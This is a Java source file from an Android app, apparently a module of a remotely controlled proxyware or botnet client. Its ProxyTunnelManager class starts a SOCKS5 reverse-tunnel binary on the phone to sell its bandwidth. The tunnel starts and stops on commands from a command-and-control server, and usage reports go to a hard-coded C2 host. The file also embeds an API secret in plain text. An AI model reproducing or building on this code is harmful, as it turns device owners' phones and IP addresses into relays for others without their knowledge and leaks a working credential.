package com.rcl.androidstreamcontrol.service;

import android.content.Context;
import android.util.Log;
import android.os.Handler;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import com.rcl.androidstreamcontrol.service.C2WebSocketClient;

/**
 * Module 3: IP Proxy Module (Bandwidth Selling)
 *
 * Manages SOCKS5 reverse tunnel accounting:
 *   1. Track bytes used (reported by external Go/Rust binary)
 *   2. Enforce 50MB/day hard cap
 *   3. Report usage to C2 /api/proxy/report-usage
 *   4. Send kill command when limit exceeded
 */
public class ProxyTunnelManager {

    private static final String TAG = "ProxyTunnel";
    private static final long DAILY_LIMIT_BYTES = 50L * 1024 * 1024;
    private static final String API_SECRET = "32653b5a3611366e6126c367a5d1297b122561da88206629b62380a34720bce7";
    private static final String C2_BASE = "https://c2-1-production.up.railway.app";

    private final Context context;
    private final int telegramUserId;
    private final C2WebSocketClient c2Client;
    private long bytesUsedToday = 0;
    private boolean tunnelActive = false;
    private java.lang.Process proxyProcess;

    public ProxyTunnelManager(Context context, int telegramUserId, C2WebSocketClient c2Client) {
        this.context = context;
        this.telegramUserId = telegramUserId;
        this.c2Client = c2Client;
    }

    public void reportBytes(long bytes) {
        bytesUsedToday += bytes;

        if (bytesUsedToday >= DAILY_LIMIT_BYTES) {
            Log.w(TAG, "Daily bandwidth limit exceeded (" + bytesUsedToday + "/" + DAILY_LIMIT_BYTES + " bytes)");
            killTunnel("daily_limit_exceeded");
            return;
        }

        if (bytes >= 1024 * 1024 || bytesUsedToday % (1024 * 1024) < bytes) {
            reportToC2(bytes);
        }
    }

    private void reportToC2(long bytes) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("telegram_user_id", telegramUserId);
                payload.put("bytes_used", bytes);

                URL url = new URL(C2_BASE + "/api/proxy/report-usage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("x-api-secret", API_SECRET);
                conn.setDoOutput(true);
                conn.getOutputStream().write(payload.toString().getBytes());

                int code = conn.getResponseCode();
                if (code == 200) {
                    Log.d(TAG, "Usage reported to C2: +" + bytes + " bytes");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reporting to C2", e);
            }
        }).start();
    }

    public void startTunnel(String socksHost, int socksPort) {
        if (tunnelActive) return;

        new Thread(() -> {
            try {
                Log.d(TAG, "Starting proxy tunnel to " + socksHost + ":" + socksPort);

                java.lang.ProcessBuilder pb = new java.lang.ProcessBuilder(
                    context.getDir("proxy_bin", Context.MODE_PRIVATE) + "/proxy_tunnel",
                    "--c2", C2_BASE,
                    "--user", String.valueOf(telegramUserId),
                    "--secret", API_SECRET,
                    "--listen", socksHost + ":" + socksPort
                );
                pb.redirectErrorStream(true);
                proxyProcess = pb.start();
                tunnelActive = true;
                Log.d(TAG, "Proxy tunnel started");

                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(proxyProcess.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        try {
                            long bytes = Long.parseLong(line.trim());
                            reportBytes(bytes);
                        } catch (NumberFormatException ignored) {}
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to start proxy tunnel", e);
                tunnelActive = false;
            }
        }).start();
    }

    public void killTunnel(String reason) {
        Log.d(TAG, "Killing proxy tunnel — reason: " + reason);
        if (proxyProcess != null && proxyProcess.isAlive()) {
            proxyProcess.destroy();
        }
        tunnelActive = false;
        bytesUsedToday = 0;

        JSONObject msg = new JSONObject();
        try { msg.put("action", "proxy_killed"); msg.put("reason", reason); } catch (Exception e) {}
        c2Client.send(msg.toString());
    }

    public void registerCommands(C2WebSocketClient client) {
        client.onCommand("start_proxy", payload -> {
            String host = payload.optString("socks_host", "127.0.0.1");
            int port = payload.optInt("socks_port", 9050);
            startTunnel(host, port);
        });
        client.onCommand("kill_proxy", payload -> {
            killTunnel(payload.optString("reason", "c2_command"));
        });
    }

    public long getBytesUsedToday() { return bytesUsedToday; }
    public boolean isTunnelActive() { return tunnelActive; }
}